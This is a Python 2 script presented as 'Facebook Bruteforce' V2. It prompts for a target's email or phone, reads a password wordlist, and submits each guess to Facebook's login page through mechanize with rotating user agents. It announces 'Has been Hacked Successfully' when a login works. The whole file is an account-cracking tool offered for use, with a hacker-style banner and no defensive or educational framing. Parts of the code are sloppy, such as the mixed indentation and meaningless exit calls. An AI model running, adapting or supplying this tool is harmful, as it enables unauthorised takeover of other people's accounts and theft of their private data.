#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from __future__ import print_function
from colorama import init, Fore

init()
import sys,time,os
import mechanize
import cookielib
import random
os.system('clear')
print (Fore.RED + 'WINDOWS')
time.sleep(3.0)
os.system('clear')

print(Fore.GREEN + "               ***********************************************")
print(Fore.GREEN + "               *" + Fore.RED + "     Welcome to Facebook Hack!!              " + Fore.GREEN + "*")
print(Fore.GREEN + "               ***********************************************")
print(Fore.GREEN + "               *" + Fore.YELLOW + "  Home  " + Fore.GREEN + "*" + Fore.YELLOW + "        Message " + Fore.GREEN + "*" + Fore.YELLOW + "   Notification    " + Fore.GREEN + "*")
print(Fore.GREEN + "               ***********************************************")
print("               *     *                                       *")
print(Fore.GREEN + "               *     *" + Fore.RED + "             STATUS                    " + Fore.GREEN + "*")
print(Fore.GREEN + "               *******                                       *")
print("               ***********************************************")
print("               ***********************************************")
print(Fore.GREEN + "               *" + Fore.CYAN + "          Your Account has been Hacked!!     " + Fore.GREEN + "*")
print(Fore.GREEN + "               *                                             *")
print("               *                                             *")
print("               *                                             *")
print("               _______________________________________________")
print("")
print(Fore.RED + "                                   Edmark.net ")
print("                              Facebook Bruteforce")
print("                                  Version: V2")
print("                         Created by: Edmark Jay Sumampen")
print



#email
email = str(raw_input(Fore.MAGENTA + "\n\nEmail or Phone: "))
wp = 'wordlist/pass.txt'
#wordlist
passwordlist = str(raw_input(Fore.CYAN + "Wordlist Path : or (enter if its already) ")) + wp

#Target Website
login = 'https://www.facebook.com/login.php?login_attempt=1'

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")
	print ("\n\n\n\n   launch = launch the facebook bruteforce attack again")
	print ("   quit = return in Fish cracker main menu")
	t = raw_input(Fore.CYAN + "\n\n Select your choice " + Fore.RESET)
	if t == "launch":
                os.system("edfb.py")
        elif t == "quit":
                os.system("exit()")
        else:
                print (" Invalid Command")
                exit()
	



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print(Fore.GREEN + "\n[+] Email/Phone: " + email + " Password: {}".format(password) + Fore.RESET)
			print(Fore.GREEN + "[+] " + email + " Has been Hacked Successfully!!!" + Fore.RESET) 
			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
			if m == 'y':
				exit()
			elif m == 'n': 
				os.system("exit()")
				


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	print
	print (" [*] Account to crack : {}".format(email))
	print (" [*] Loaded :" , len(total), "passwords")
	print (" [*] Cracking, please wait ...\n\n")


if __name__ == '__main__':
	main()

